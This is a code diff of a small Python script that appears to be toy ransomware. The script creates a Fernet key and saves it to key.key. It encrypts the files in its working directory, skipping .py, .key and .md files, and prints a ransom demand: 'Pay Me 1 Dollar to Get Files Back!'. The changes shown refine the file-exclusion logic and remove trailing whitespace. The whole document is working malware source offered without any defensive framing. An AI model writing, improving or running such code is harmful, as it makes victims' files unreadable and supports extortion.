@@ -3,9 +3,10 @@
 import os
 from cryptography.fernet import Fernet
 
-files = os.listdir()
-targets = []
-current_key = 'key.key'
+files           = os.listdir()
+targets         = []
+current_key     = 'key.key'
+excluded_files = ('.py', '.key', '.md')
 
 # Generate encryption key if it is not exist and save it to a text file 
 if not os.path.exists(current_key):
@@ -15,15 +16,14 @@ if not os.path.exists(current_key):
     key_file.write(key)
     key_file.close()
 
-
     if os.path.exists(current_key): 
         
         for file in files:
 
-            file_extension = os.path.splitext(file)
+            file_extension = os.path.splitext(file)[1].lower()
 
             # Execlude Python scripts & key from decryption
-            if file.lower().endswith(('.py', '.key')):
+            if file_extension in excluded_files:
                 continue
 
             # Execlude directories from encryption
@@ -45,16 +45,3 @@ if not os.path.exists(current_key):
         print('Your Files Have Been Encrypted! Pay Me 1 Dollar to Get Files Back!')
 else:
     print('Your Files Already Encrypted :)')
- 
-        
-
-
-
-
-
-
-
-    
-
-
-    
